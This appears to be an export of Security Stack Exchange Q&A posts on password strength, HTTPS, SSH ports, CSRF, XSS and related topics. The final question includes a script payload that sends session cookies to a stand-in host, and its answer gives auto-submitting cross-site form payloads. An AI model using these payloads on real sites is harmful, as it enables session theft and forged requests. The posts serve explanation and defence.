<p>Take note that perjury is a serious offence, so people tend not to deny sending emails when what is at stake (e.g. a commercial dispute) is ""less serious"" than the consequences of being caught in the act of lying to the judge. The crucial point is that proving whether an email was really sent by some specific individual is a complex matter <em>in both ways</em>: it is hard to convincingly pinpoint on the perpetrator, but it is equally hard to make sure that it will never be decisively proven.</p>

<p>This reproduces the security model of <strong>handwritten signatures</strong>. It is, in fact, not very difficult to imitate the signature of somebody else; it is also quite hard to actually verify that a signature is proper or not. But handwritten signatures happen in the physical world, with pens and human hands, so they tend to leave traces -- what I call contextual elements. You can repudiate your own signature, but it is risky, because you cannot be sure that nobody saw you, or you did not leave a fingerprint on the pen, or any other of a million possible incriminating details. And trying to repudiate your own signature is severely punished. Therefore, it is often preferable to recognize the signature as your own and assume the consequences.</p>

<p>In the case of emails, the same mechanism is at work. Though actual proofs are often flimsy elements (log entries and so on), denying having sent an email that you did send is risky, and felt as risky, especially since it involves computers (computers are beyond the ""magical horizon"" of most people). So most cases involving emails end up with producing a few log file entries (that could, indeed, be faked in a great many ways), and the sender crumbling under the steady gaze of the judge.</p>
","68902"
"Obsolete cryptography (SHA1) warning although certificate uses SHA256","23441","","<p>I ordered a certificate with SHA256 from Comodo and was wondering why Chrome shows this message:</p>

<blockquote>
  <p>Your connection is encrypted with obsolete cryptography.</p>
  
  <p>The connection is encrypted using AES_256_CBC, with SHA1 for message
  authentication and DHE_RSA as the key exchange mechanism.</p>
</blockquote>

<p>It complains about SHA1 although the only certificate that uses SHA1 is the root certificate, which shouldn't be the problem. <strong>Why does Chrome show the warning like this?</strong></p>

<p>Here is the result from the SSL Labs test (certificate information and cipher suites on the server):</p>

<p><em>Path #1</em></p>

<blockquote>
  <p>[my domain]<br>
  RSA 2048 bits (e 65537) / SHA256withRSA</p>
  
  <p>COMODO RSA Domain Validation Secure Server CA<br>
  RSA 2048 bits (e 65537) / SHA384withRSA</p>
  
  <p>COMODO RSA Certification Authority<br>
  RSA 4096 bits (e 65537) / SHA384withRSA</p>
</blockquote>

<p><em>Path #2</em></p>

<blockquote>
  <p>[my domain]<br>
  RSA 2048 bits (e 65537) / SHA256withRSA</p>
  
  <p>COMODO RSA Domain Validation Secure Server CA<br>
  RSA 2048 bits (e 65537) / SHA384withRSA</p>
  
  <p>COMODO RSA Certification Authority<br>
  RSA 4096 bits (e 65537) / SHA384withRSA</p>
  
  <p>AddTrust External CA Root<br>
  RSA 2048 bits (e 65537) / SHA1withRSA</p>
</blockquote>

<p><em>Cipher Suites</em></p>

<blockquote>
  <p>TLS_DHE_RSA_WITH_AES_256_GCM_SHA384<br>
  TLS_DHE_RSA_WITH_AES_256_CBC_SHA256<br>
  TLS_DHE_RSA_WITH_AES_256_CBC_SHA<br>
  TLS_DHE_RSA_WITH_CAMELLIA_256_CBC_SHA<br>
  TLS_DHE_RSA_WITH_AES_128_GCM_SHA256<br>
  TLS_DHE_RSA_WITH_AES_128_CBC_SHA256<br>
  TLS_DHE_RSA_WITH_AES_128_CBC_SHA<br>
  TLS_DHE_RSA_WITH_CAMELLIA_128_CBC_SHA</p>
</blockquote>

<p><strong>Note:</strong> I know that AES_256_CBC isn't considered modern cryptography, so the warning about obsolete cryptography would still appear. I was just wondering about the SHA1 part.</p>
","<p><strong>The error message is just misleading</strong></p>

<p>You said yourself:</p>

<blockquote>
  <p>I know that AES_256_CBC isn't considered modern cryptography, so the warning about obsolete cryptography would still appear.</p>
</blockquote>

<p>And that is why you get that message.</p>

<p>Now unfortunately the message itself is not very clearly phrased.</p>

<p>SHA-1 is used in several circumstances. And here the ""SHA-1"" refers to HMAC message authentication and not to its use inside certificates.</p>

<p>From the <a href=""https://www.chromium.org/Home/chromium-security/education/tls"">Chromium TLS page</a> (Archived <a href=""https://archive.is/tLi3o"">here</a>.):</p>

<blockquote>
  <p><strong>Message Authentication</strong></p>
  
  <p>You may see:</p>
  
  <p><em>“The connection is using [cipher] with SHA1 for message authentication.”</em></p>
  
  <p>This actually means that the connection is using HMAC-SHA1 for data integrity, rather than as a certificate signing algorithm (e.g. sha1WithRSAEncryption). The HMAC construction is strong enough that it is not broken when used with SHA1 (or even MD5) as the hash function, so this is <strong>not</strong> currently deprecated.</p>
</blockquote>

<p><strong>What to do</strong><br>
Enable <em>and have the server prefer</em> a cipher suite that Chrome likes better. Namely: Something with forward secrecy and either AES-GCM or CHACHA20_POLY1305. (The TLS page recommends <code>TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256</code>.)</p>

<p>Since that is already in your list, all you have to do is change the server's preference for it.</p>
","90391"
"Hardware USB Key to Reset Any Windows Password","23384","","<p>This tool requires physical access of course, and there are many things you can do once you have physical access, but this peaked my curiosity. </p>

<p>The tool in question: <a href=""https://www.kickstarter.com/projects/jontylovell/password-reset-key?ref=discovery"" rel=""nofollow"">https://www.kickstarter.com/projects/jontylovell/password-reset-key?ref=discovery</a></p>

<p>Obviously the magic to this piece of hardware is what's contained on it, and if that is true, any usb key could be used to accomplish the same job. I know there are software like Katana and the like that can do similar things. </p>

<p>My question is, does anyone know what this could be running to make this happen? Is it rubber ducky-like (<a href=""http://hakshop.myshopify.com/products/usb-rubber-ducky-deluxe"" rel=""nofollow"">http://hakshop.myshopify.com/products/usb-rubber-ducky-deluxe</a>) or something else?</p>

<p>I'm a security professional and penetration tester by trade, but no administrative windows expert and most of my work is done remotely, so I put this out to the on-site guys and the windows experts.</p>

<p>I'm not looking to knock off the product, in fact, I think quite the opposite, its a cool piece of kit and may purchase one for kicks. Just curious if anyone knows whats going on behind the curtain.</p>
","<p>Resetting a windows password is not equivalent to recovering a windows password.</p>

<p><strong>Resetting a password</strong></p>

<p>The password can be reset by booting to another operating system and editing the registry hive. This is trivial, and there are many tools which can do it, such as Trinity Recovery Kit. I suspect this USB stick just boots to a version of Linux and runs a few scripts.</p>

<p>In summary: Just write blank password entries into the SAM (which is basically just stored in the registry protected by an ACL so only SYSTEM can access it).</p>

<p>However resetting a windows password denies access to EFS encrypted files and DPAPI encrypted data, since the keys for these are encrypted using a KEK derived from the password. When the user changes their password, they are re-encrypted with the new KEK. Access to EFS and DPAPI resources is lost even if the administrator resets the password.</p>

<p><strong>Recovering a password</strong></p>

<p>A recovered password allows continued access to EFS and DPAPI protected resources. In addition, it may give access to additional resources (e.g. it may be a domain logon).</p>

<p>To recover the password you need a tool like John the Ripper, Lopht or HashCat. Which could also run off a USB stick. Extract the hashes from the SAM, feed them to a cracking program. Then reboot and log in with recovered passwords.</p>
","49435"
"Is it possible to find who posted comment on my blogspot anonymously?","23383","","<p><strong>Problem Behind question</strong> :</p>

<p>I own an blogspot site and people used to come and comment on my posts. In recent days I can see a spammer who comments anonymously on my every blog-posts. The comments were posted under the name of anonymous. Is it possible to track the IP or some stuff related to spammer whom makes comments anonymously?</p>

<p><strong>Question</strong> :</p>

<p>How to detect who commented on my blogpost anonymously?</p>
","<p>I don't think that there is a way through what you have on Blogger if you have been allowing anonymous comments.</p>

<p>It would be possible for Google to track the IP; but even if they were inclined to react to an abuse report, they would not pass on that information to you.</p>

<hr>

<p>There are indirect ways you could narrow things down if circumstances are right and if you want to spend a lot of time doing a lot of work for uncertain results. Let's call your anonymous comments, T (for Troll). If you can find other things around the net that T has posted (using the same phrases, style, etc) then you may be able to work from those. For example, if T is posting under some pseudonym on a forum that uses Gravatar (even if T doesn't), then you may be able to get an MD5 hash of the email address T used to sign up for that forum.  This sort of de-anonymizing is <a href=""http://arstechnica.com/security/2013/07/got-an-account-on-a-site-like-github-hackers-may-know-your-e-mail-address/"">described here</a>.</p>

<p>Or maybe T boasts about trolling you in some other place. Or something like that.</p>

<p>But these sorts of methods involve a lot of uncertainty. And if T is even half way experienced at this kind of thing, then then the IP is going to be through some proxy anyway, and any email address you find will be a throw away email.</p>

<hr>

<p>It may be presumptuous of me to advise when I don't know the situation, but my inclination is to suggest that you just let it go. Don't let T's actions control your mind. Don't try to seek revenge. Just disable anonymous comments and let things go.</p>
","41753"
"Should I change the default SSH port on linux servers?","23366","","<p>Is there any advantage in changing the SSH port, I've seen people do that, but I can't seem to find the reason why.</p>

<p>If you have a strong password and/or a certificate, is it useful for anything?</p>

<p>Edit:</p>

<p>I should also mention that I am using iptables rules to limit brute forcing attacks, only 5 login attempts are allowed per minute per IP address.</p>
","<p>The Internet is a wild and scary place, full of malcontents whose motives range from curiosity all the way to criminal enterprise. These unsavories are constantly scanning for computers running services they hope to exploit; usually the more common services such as SSH, HTTP, FTP, etc. The scans typically fall into one of two categories:</p>

<ol>
<li>Recon scans to see what IP address have those services open.</li>
<li>Exploit scans against IP addresses who have been found to be running a specific service.</li>
</ol>

<p>Considering how large the Internet is it is typically infeasible to look on every port of every IP address to find what's listening everywhere. This is the crux of the advice to change your default port. If these disaffected individuals want to find SSH servers they will start probing each IP address on port 22 (they may also add some common alternates such as 222 or 2222). Then, once they have their list of IP addresses with port 22 open, they will start their password brute force to guess usernames/passwords or launch their exploit kit of choice and start testing known (at least to them) vulnerabilities on the target system.</p>

<p>This means that if you change your SSH port to 34887 then that sweep will pass you on by, likely resulting in you not being targeted by the followup break-in.</p>

<p>Seems rosy right? There are some disadvantages though.</p>

<ol>
<li>Client Support: Everybody who connects to your server will need to know and use the changed port. If you are in a heavily managed environment, this configuration can be pushed down to the clients, or if you have few enough users it should be easy to communicate.</li>
<li>Documentation Exceptions: Most network devices, such as firewalls and IDSes, are pre-setup for common services to be run on common ports. Any firewall rules related to this service on this device will need to be inspected and possibly modified. Similarly, IDS signatures will be tweaked so as to only perform SSH inspection on port 22. You will need to modify every signature, every time they are updated, with your new port. (As a data point there are currently 136 VRT and ET snort signatures involving SSH).</li>
<li>System Protections: Modern Linuxes often ship with an kernel layer MAC and/or RBAC systems (e.g. SELinux on RedHat based or AppAmor on Debian based) and that are designed to only allow applications to do exactly what they're intended to do. That could range from accessing the <code>/etc/hosts</code> file, to writing to a specific file, or sending a packet out on the network. Depending on how this system is configured it may, by default, forbid <code>sshd</code> from binding to a non-standard port. You would need to maintain a local policy that would allow it.</li>
<li>Other Party Monitoring: If you have an external Information Security division, or outsource monitoring, then they will need to be made aware of the change. When performing a security assessment, or analyzing logs looking for security threats, if I see an SSH server running on a non-standard port (or an SSH server on a non-UNIX/Linux for that matter) I treat it as a potential backdoor and invoke the compromised system part of incident handling procedure. Sometimes it is resolved in 5 minutes after making a call to the administrator and being told it's legitimate, at which point I update documentation, other times it really is badness that gets taken care of. In any event, this can result in down-time for you or, at the least, a nerve racking call when you answer your phone and hear, ""Hi, this is Bob from the Information Security Office. I have a few questions for you.""</li>
</ol>

<p>Before changing your port you need to take all of this into account so you know you're making the best decision. Some of those disadvantages may not apply, but some certainly will. Also consider what you're trying to protect yourself against. Often times it is simply easier to just configure your firewall to only allow access to 22 from specific hosts, as opposed to the whole Internet.</p>
","32311"
"Why do I need to hide my phone's IMEI","23342","","<p>If it is a secret then why is it visible on the box, invoice and the back of the phone?
If it is not a secret then why does it have to be blurred when it gets posted online?</p>

<p><img src=""https://i.stack.imgur.com/6HUMK.jpg"" alt=""enter image description here""></p>
","<p>IMEI is like a GUID (Global Unique Identifier), that identifies your unique handset. Your carrier can <a href=""http://www.gsma.com/technicalprojects/fraud-security/imei-database"">blacklist your IMEI by instructing the GSM Alliance to do so,</a> so that the mobile can't connect to any networks, usually in the case the handset is lost or stolen.</p>

<p>Your handset's IMEI is sent in the handshake process when connecting to a network, and can be searched in the global database by your carrier to identify the make &amp; model of your device.
This is useful as it allows the carrier to send over the correct internet/MMS configuration settings automatically, and may turn off promotional messages your carrier may send promoting the newest device if you already have that device.</p>

<p>You would not want to reveal your IMEI for the following reasons:</p>

<ol>
<li>Criminals can use an IMEI to do, well, criminal stuff</li>
<li>It makes your device vulnerable and can be hacked</li>
</ol>

<p>Scenarios:</p>

<ul>
<li>A device manufacturer discovers that the battery in some devices can spontaneously combust and explode. The device manufacturer offers a replacement process whereupon if you present your IMEI you are eligible for a free replacement device. <em>Unfortunately a criminal got hold of your IMEI and claimed the free device, but as the IMEI has already been claimed, you can't claim a new free handset</em>.</li>
<li>A hacker knows how much you are worth, and bad news, they have your IMEI. Through a simple SIM-unlocking site they can obtain the make and model of the device, and maybe the operating system version residing on it. They can now proceed to send you some spam/dodgy way of installing spyware onto your device. They can now steal your data and thus, your wealth.</li>
</ul>
","71818"
"Why is it dangerous to open a suspicious email?","23280","","<p>I would like to know why is it considered to be dangerous to open an email from an unknown source? </p>

<p>I am using Gmail and I thought it's only unsafe to download an attachment and run it.</p>

<p>The first thing that came into my mind was what if the email text contains XSS JavaScript code but I am sure that every email provider has protected their site from getting <em>XSS-ed</em>.</p>

<p>What is going on behind the scenes when you get infected just by clicking on email and reading its content, for example on Gmail?</p>
","<p>There's a small risk of an unknown bug — or a known but unpatched one — in your mail client allowing an attack by just viewing a message.</p>

<p>I think, though, that this very broad advice is given also as a defense against some types of phishing scams. Social engineering attacks are common and can lead to serious trouble, and making sure people are at least <em>suspicious</em> is a first line of defense. This is like telling an elderly grandparent to never give their credit card info over the phone — okay, sure, there are plenty of circumstances where doing so is relatively safe, but when they <em>keep</em> getting scammed over and over, it's easier to just say: don't do it.</p>

<p>Likewise, not opening mail keeps you from reading about the plight of an orphan in a war-torn region who has unexpectedly found a cache of Nazi gold and just needs $500 to smuggle it out and they'll share half with you, and your heart just goes out, and also that money wouldn't hurt.... Or, while you <em>know</em> the rule about attachments, this one says that it's pictures of the cutest kittens ever, and how can <em>that</em> be harmful — I'll just click it and okay now there are these boxes saying do I want to allow it, which is annoying because of course I do because I want to see the kittens....</p>
","135935"
"Is the HTTP TRACE method a security vulnerability?","23166","","<p>I saw many posts here on this site dishing out advice on disabling HTTP TRACE method to prevent <a href=""https://www.owasp.org/index.php/Cross_Site_Tracing"">cross site tracing</a>. I sought to do the same thing. But when I read the <a href=""http://httpd.apache.org/docs/trunk/mod/core.html#traceenable"">Apache documentation</a>, it gives the opposite advice:</p>

<blockquote>
  <p>Note</p>
  
  <p>Despite claims to the contrary, TRACE is not a security vulnerability
  and there is no viable reason for it to be disabled. Doing so
  necessarily makes your server non-compliant.</p>
</blockquote>

<p>Which should I follow?</p>
","<p>One of the wisest security principles says that what is unused should be disabled.</p>

<p>So the first questions is: <strong>Are you really going to use it? Do you need it to be enabled?</strong></p>

<p>If you are not going to use <code>TRACE</code> method then in my opinion it should be switched off. It will prevent your app not only against <a href=""https://www.owasp.org/index.php/Cross_Site_Tracing"">XST</a>, but also against undiscovered vulnerabilities related to this channel, which can be found in the future.</p>
","56976"
"Is the NHS wrong about passwords?","23144","","<p>An NHS doctor I know recently had to do their online mandatory training questionnaire, which asks a bunch of questions about clinical practice, safety and security. This same questionnaire will have been sent to all the doctors in this NHS trust.</p>

<p>The questionnaire included the following question:</p>

<blockquote>
  <p>Which of the following would make the most secure password? Select one:</p>
  
  <p>a. 6 letters including lower and upper case.<br>
  b. 10 letters a mixture of upper and lower case.<br>
  c. 7 characters that include a mixture of numbers, letters and special characters.<br>
  d. 10 letters all upper case.<br>
  e. 5 letters all in lower case.</p>
</blockquote>

<p>They answered ""b"", and they lost a mark, as the ""correct answer"" was apparently ""c"".</p>

<p>It is my understanding that as a rule, extending password length adds more entropy than expanding the alphabet. I suppose the NHS might argue that people normally form long passwords out of very predictable words, making them easy to guess. But if you force people to introduce ""special characters"" they also tend to use them in very predictable ways that password guessing algorithms have no trouble with.</p>

<p>Although full disclosure, I'm not a password expert - I mostly got this impression from Randall Munroe (click for discussion):</p>

<p><a href=""https://security.stackexchange.com/q/6095/79319""><img src=""https://imgs.xkcd.com/comics/password_strength.png"" alt=""password strength""></a></p>

<p>Am I wrong?</p>
","<p>By any measure, they're wrong:</p>

<p>Seven random printable ASCII: 95<sup>7</sup> = 69 833 729 609 375 possible passwords.</p>

<p>Ten random alphabetics: 52<sup>10</sup> = 144 555 105 949 057 024 possible passwords, or over 2000 times as many.</p>

<p>Length counts.  If you're generating your passwords randomly, it counts for far more than any other method of making them hard to guess.</p>
","139001"
"What is the purpose of confirming old password to create a new password?","23089","","<p><a href=""https://i.stack.imgur.com/2leX7.png"" rel=""noreferrer""><img src=""https://i.stack.imgur.com/2leX7.png"" alt=""enter image description here""></a></p>

<p>Suppose that someone stole my password, he/she can easily change it by confirming the old password.</p>

<p>So, I am curious that why do we need that step and what is the purpose of using old password confirmation? </p>
","<p>If you are logged in and I sit down at your computer, I can lock you out of your account and transfer ownership to myself.</p>
","162023"
"CSRF with JSON POST","23041","","<p>I am playing around with a test application which accepts JSON requests and response is also JSON. I am trying to do a CSRF for a transaction which accepts only JSON data with POST method in request. Application throws an error if URL is requested using get method (e.g. in <code>&lt;script src=</code>).</p>

<p>Also for the attack to be meaningful i.e. transaction to go through,  I have to send the data in the request. If I create my own page and send the JSON requests, cookies do not travel and hence server returning an unauthenticated error message. </p>

<p>There are no random tokens in original request by server.</p>

<p>I was wondering is there any way to carry out a successful CSRF attack in this scenario. </p>
","<p>You must at the very least check for <code>Content-Type: application/json</code> on the request.</p>

<p>It's not possible to get a POSTed <code>&lt;form&gt;</code> to submit a request with <code>Content-Type: application/json</code>. But you can submit a form with a valid JSON structure in the body as <code>enctype=""text/plain""</code>.</p>

<p>It's not possible to do a cross-origin (<a href=""http://www.w3.org/TR/cors/"">CORS</a>) XMLHttpRequest POST with <code>Content-Type: application/json</code> against a non-cross-origin-aware server because this will cause a ‘pre-flighting’ HTTP OPTIONS request to approve it first. But you can send a cross-origin XMLHttpRequest POST <a href=""http://www.w3.org/TR/XMLHttpRequest2/#the-withcredentials-attribute"">withCredentials</a> if it is <code>text/plain</code>.</p>

<p>So even with <code>application/json</code> checking, you can get pretty close to XSRF, if not completely there. And the behaviours you're relying on to make that secure are somewhat obscure, and still in Working Draft stage; they are not hard-and-fast guarantees for the future of the web.</p>

<p>These might break, for example if a new JSON <code>enctype</code> were added to forms in a future HTML version. (WHATWG added the <code>text/plain</code> enctype to HTML5 and originally tried also to add <code>text/xml</code>, so it is not out of the question that this might happen.) You increase the risk of compromise from smaller, subtler browser and plugin bugs in CORS implementation.</p>

<p>So whilst you can probably get away with it for now, I absolutely wouldn't recommend going forward without a proper anti-XSRF token system.</p>
","10231"
"Can wifi administrator see data transfer over android phone. precisely gmail app communication","23013","","<p>sometimes I connect to wifi outside my home in office , restaurants and friends house. I want to know if wifi administrator can see the exact data my android phone communicates?</p>

<p>I am only concerned about gmail and skype apps to be precise. I believe Gmail uses some sort of encoding before data transmission making it hard to read even if administrator see the data transmission.</p>

<p>Please correct me if I am wrong. Also if you can tell me some security measures I can take to protect the privacy.</p>

<p>Thanks,
kiran</p>
","<p>Yes, your data is not protected by default and can be intercepted by people that administer the WIFI and other devices that transfer data on the network.</p>

<p>The encoding you are talking about is SSL. SSL enabled websites will protect your data from being read by attackers that can control the communication channel (WIFI, ethernet cable, ISP). Here is a good description of <a href=""http://computer.howstuffworks.com/encryption4.htm"" rel=""nofollow"">how SSL works</a>.</p>

<p>For the data that is not protected by SSL, you can use the technology called VPN. This would encrypt and protect all your communication from being intercepted by attackers. Here are <a href=""http://www.makeuseof.com/tag/7-completely-free-vpn-services-protect-privacy/"" rel=""nofollow"">7 free VPN services</a>.</p>
","30327"
"What are the realistic, and most secure crypto for Symmetric, Asymmetric, Hash, Message Authentication Code ciphers?","22996","","<p>I'm interested in updating this two pronged question for 2011:</p>

<ol>
<li><p>What cryptology is most appropriate for low-powered devices (such as a cellphone), and yet still effective?</p></li>
<li><p>What cryptology is most secure for a .NET developer?</p></li>
</ol>

<p>In November of '08 <a href=""https://stackoverflow.com/users/5542/rasmus-faber"">Rasmus Faber</a> answered <a href=""https://stackoverflow.com/questions/258721/which-built-in-net-cryptography-algorithm-is-the-most-secure"">this</a> similar Stack Overflow question with this response:</p>

<blockquote>
  <ul>
  <li><p>Symmetric cipher: <a href=""http://msdn.microsoft.com/en-us/library/system.security.cryptography.aesmanaged.aspx"" rel=""nofollow noreferrer"">AES-256</a></p></li>
  <li><p>Asymmetric cipher: <a href=""http://msdn.microsoft.com/en-us/library/system.security.cryptography.rsacryptoserviceprovider.aspx"" rel=""nofollow noreferrer"">RSA</a> with 4096 bit key (I believe that is the
  maximum in .NET) or <a href=""http://msdn.microsoft.com/en-us/library/system.security.cryptography.ecdsa.aspx"" rel=""nofollow noreferrer"">ECDSA</a> with
  571 bit key (but that is only
  supported in .NET 3.5)</p></li>
  <li><p>Hash: <a href=""http://msdn.microsoft.com/en-us/library/system.security.cryptography.sha512.aspx"" rel=""nofollow noreferrer"">SHA-512</a></p></li>
  <li><p>Message Authentication Code: <a href=""http://msdn.microsoft.com/en-us/library/system.security.cryptography.hmacsha512.aspx"" rel=""nofollow noreferrer"">HMAC    with SHA-512</a></p></li>
  </ul>
  
  <p>That being said, those are overkill
  for most applications, and you should
  do fine using AES-128, RSA with 2048
  bit key, SHA-256 and HMAC with
  SHA-256.</p>
</blockquote>

<p>Are these recommendations still true today?</p>
","<p>The recommendations you cite are kind of overkill. One point to take into account is that beyond a certain level (e.g. on key size or hash function output size), all functions are ""unbreakable with foreseeable technology"" and it is a bit delicate to compare them. Stating that SHA-512 is ""more robust"" than SHA-256 means that you are imagining that SHA-256 could be broken, which, as far as we can tell for now and the next 40 years, is not true (beyond 40 years, trying to envision what technology we could have is risky; 40 years ago, nobody was imagining the Internet as it is today, but most people assumed that by 2010 we would all drive flying cars).</p>

<p>AES-128 is already secure enough, and less expensive (AES-256 uses 14 rounds, while AES-128 uses 10 rounds).</p>

<p>The currently largest broken RSA key is a 768-bit modulus, and it took some huge effort (four years, and really big brains). 1024-bit keys are considered usable for short term security, although larger keys are encouraged. 2048-bit keys are appropriate. Using a key twice larger means 8 times more work for signing or decryption, so you do not want to overdo it. See <a href=""http://www.keylength.com/"">this site</a> for a survey of how RSA key length can be related to security.</p>

<p>ECDSA over a 256-bit curve already achieves an ""unbreakable"" level of security (i.e. roughly the same level than AES with a 128-bit key, or SHA-256 against collisions). Note that there are elliptic curves on prime fields, and curves on binary fields; which kind is most efficient depends on the involved hardware (for curves of similar size, a PC will prefer the curves on a prime field, but dedicated hardware will be easier to build with binary fields; the <a href=""http://en.wikipedia.org/wiki/CLMUL_instruction_set"">CLMUL</a> instructions on the newer Intel and AMD processors may change that).</p>

<p>SHA-512 uses 64-bit operations. This is fast on a PC, not so fast on a smartcard. SHA-256 is often a better deal on small hardware (including 32-bit architectures such as home routers or smartphones).</p>

<p>Right now, cheap RFID systems are too low-powered to use any of the above (in other words, RFID systems which can are not as cheap as they could be). RFID systems still use custom algorithms of often questionable security. Cellphones, on the other hand, have ample enough CPU power to do proper cryptography with AES or RSA (yes, even cheap non-smart phones).</p>
","1755"
"My understanding of how HTTPS works (gmail for example)","22981","","<p>I want to ask if my below understanding is correct or not regarding the HTTPS used for the webpage we are visiting. </p>

<p>I will use Gmail as an example:</p>

<ol>
<li>My laptop tries to connect to the Gmail server and sends an http request </li>
<li>Gmail server replies with a request to establish https connection instead (sends https request)</li>
<li>My laptop checks the https certification of Gmail server and agrees to use https to connect</li>
<li>My laptop finds the <strong>Public Key</strong> of Gmail server and uses it to encrypt my gmail account password and sends it to Gmail Server</li>
<li>Gmail Server verifies my password by using the <strong>Private Key</strong> of Gmail Server and confirms my email logon</li>
<li>Gmail Server sends email information to my laptop by encrypting it using my laptop's <strong>Public Key</strong></li>
<li>My laptop reads the encrypted email information by decrypting it using the <strong>Private Key</strong> of my laptop</li>
<li>So on and so forth until my laptop logs out the Gmail server.</li>
</ol>

<p>Summary: there are 4 keys involved in this https connection. Gmail Server Public/Private Keys (2pc) + My Laptop Public/Private Keys (2pc)</p>
","<p>Yes, you're on the right track!  But things actually work a little bit differently than you outlined.</p>

<p>In particular, Steps 4-8 are not quite how SSL works.  SSL works a little bit differently.  Here is how it actually works (I'm going to make some small simplifications, but this should get the gist of the idea right):</p>

<ul>
<li><p>The Gmail server sends your client a <em>certificate</em>.  The certificate includes the Gmail server's public key, and some evidence that this public key actually belongs to <code>gmail.com</code>.</p></li>
<li><p>Your browser verifies the evidence in the certificate, to confirm that it has the proper public key for <code>gmail.com</code>.</p></li>
<li><p>Your browser chooses a random new symmetric key <em>K</em>  to use for its connection to Gmail.  It encrypts <em>K</em> under Gmail's public key.</p></li>
<li><p>Gmail decrypts <em>K</em> using its private key.  Now both your browser and the Gmail server know <em>K</em>, but no one else does.</p></li>
<li><p>Anytime your browser wants to send something to Gmail, it encrypts it under <em>K</em>; the Gmail server decrypts it upon receipt.  Anytime the Gmail server wants to send something to your browser, it encrypts it under <em>K</em>.</p></li>
</ul>

<p>Your Steps 1-3 are roughly right, though not exactly right, and the details depend a little bit upon what browser you use and what URL you type into the address bar or how you get to Gmail in the first place -- but what you wrote is close enough for understanding the basic concept.  Good enough for government work.</p>

<p>Here is some additional reading for you: </p>

<p><a href=""https://security.stackexchange.com/q/6290/971"">How is it possible that people observing an HTTPS connection being established wouldn't know how to decrypt it?</a></p>

<p><a href=""https://security.stackexchange.com/q/7421/971"">How do the processes for digital certificates, signatures and ssl work?</a></p>

<p><a href=""https://security.stackexchange.com/q/9129/971"">Purpose of certificates signed and trusted by CA</a></p>

<p><a href=""https://security.stackexchange.com/q/11832/971"">Why is faking SSL certificate difficult?</a></p>

<p><a href=""https://security.stackexchange.com/q/4369/971"">Why is HTTPS not the default protocol?</a></p>

<p><a href=""https://security.stackexchange.com/q/1525/971"">Is visiting HTTPS websites on a public hotspot secure?</a></p>

<p>I think those articles should give you an excellent understanding of SSL, how it works, and why it is designed the way it is.</p>

<p>If that's not enough, you must have more more more, here are some articles from Wikipedia: </p>

<p><a href=""https://en.wikipedia.org/wiki/Public_key_certificate"" rel=""nofollow noreferrer"">How certificates work</a></p>

<p><a href=""https://en.wikipedia.org/wiki/Secure_Socket_Layer"" rel=""nofollow noreferrer"">How SSL works</a></p>

<p>However they probably have way more technical details than you ever wanted to know, and they aren't a great first introduction to the concepts or the basic ideas.</p>
","13690"
"What advantages and disadvantages do Palo Alto firewalls have, compared to others in the market","22919","","<p>I am about to start an evaluation process for firewalls. I have experience with Checkpoint and Juniper, but I don't have any information on Palo Alto networks, other than their marketing stuff. </p>

<p>So I would like to hear from IT analysts/network administration the pros and cons of Palo Alto in areas such as:</p>

<ul>
<li>Ability to identify malicious traffic at speed</li>
<li>Ease of configuration - through management console, individual GUI, command line etc</li>
<li>Remote management functionality</li>
<li>Logging functionality</li>
<li>Does it play well with other vendors' hardware</li>
</ul>

<p>etc.</p>
","<p>Let me state up front, that I am a partner of Palo Alto Networks as well as Check Point and Juniper. Over the years we have had a lot of success with all three manufacturers. Palo Alto Networks has built a network security device that is technically different from everything else on the market. If you clear away the marketing BS, there is no denying it. My technical explanation follows in the next paragraph. Whether you think what Palo Alto Networks does is important enough to make the switch, that's up to you.</p>

<p>The purpose of a firewall is to enable you to create a Positive Enforcement Model (default deny) control between two networks that have different trust levels. Traditional stateful inspection firewalls were able to this when they first appeared in the mid 1990s. They can no longer do it because of the way modern applications are written using techniques such as port sharing, port hopping, tunneling, and encryption. </p>

<p>To the best of my knowledge, Palo Alto Networks is the only firewall on the market that allows you to do implement a Positive Enforcement Model. Furthermore, Gartner just came out with their Firewall Magic Quadrant in late December 2011 and said the same thing. </p>

<p>Palo Alto's IPS functionality matches up very well with the best stand-alone IPS's in the industry according to NSS Labs, a well respected security product evaluation shop in the UK. What is interesting is that the PAN IPS functionality needs less tuning because it knows the application and applies only the relevant signatures.</p>

<p>WRT to UI, CLI, logging, and other ""standard"" firewall features, PAN is satisfactory.</p>

<p>Finally, Palo Alto continues to innovate with support for remote and mobile users and for analyzing files for malware in a separate (cloud-based) process that does not impact stream processing.</p>
","10926"
"Reflected XSS attack via POST request and XML payload","22905","","<p>I know that a reflected XSS can be done with a GET request like: </p>

<pre><code>http://site.com?search=&lt;script&gt;location.href='http://hackers.com?sessionToken='+document.cookie;&lt;/script&gt;
</code></pre>

<p>As long the response looks similar to this:</p>

<pre><code>&lt;html&gt;
    &lt;head&gt;
        &lt;title&gt;Your Serach Results&lt;/title&gt;
    &lt;/head&gt;
    &lt;body&gt;
        &lt;h2&gt;No results for: &lt;/h2&gt;
        &lt;script&gt;location.href='http://hackers.com?sessionToken='+document.cookie;&lt;/script&gt;
    &lt;/body&gt;
&lt;/html&gt;
</code></pre>

<p>But is this attack still possible, in case that the search term is send along a POST request in the http body as part of XML content. This approch is often used by RESTful services.</p>

<pre><code>&lt;Query&gt;
    &lt;SearchTerm&gt;
        script&gt;location.href='http://hackers.com?sessionToken='+document.cookie;&lt;/script&gt;
    &lt;/SearchTerm&gt;
&lt;/Query&gt;
</code></pre>

<p>If this is possible, how can an attacker achieve this? </p>

<p><strong>[EDIT]</strong></p>

<p>It is also required that the <code>Content-Type</code> header is set to <code>application/xml</code></p>
","<p>Attacker can use to auto submittable remote form with the default values. like this :</p>

<pre><code>&lt;form name=""x"" action=""http://site/index"" method=""post""&gt;
&lt;input type=""hidden"" name='search' value='&lt;script&gt;alert(/XSS/)&lt;/script&gt;'&gt;
&lt;/form&gt;
&lt;script&gt;document.x.submit();&lt;/script&gt;
</code></pre>

<hr>

<pre><code>&lt;form name=""x"" action=""http://site/index"" method=""post""&gt;
&lt;input type=""hidden"" name='&lt;?xml version' value='""1.0""?&gt;&lt;query&gt;&lt;script&gt;alert(/XSS/)&lt;/script&gt;&lt;/query&gt;'&gt;
&lt;/form&gt;
&lt;script&gt;document.x.submit();&lt;/script&gt;
</code></pre>

<p>And add a script with XHTML namespace, it will run.
<a href=""http://www.securation.com/files/2013/09/script.xml"" rel=""nofollow noreferrer"">Example</a></p>

<pre><code>sajjad@xxx:~$ curl http://www.securation.com/files/2013/09/script.xml -v
* About to connect() to www.securation.com port 80 (#0)
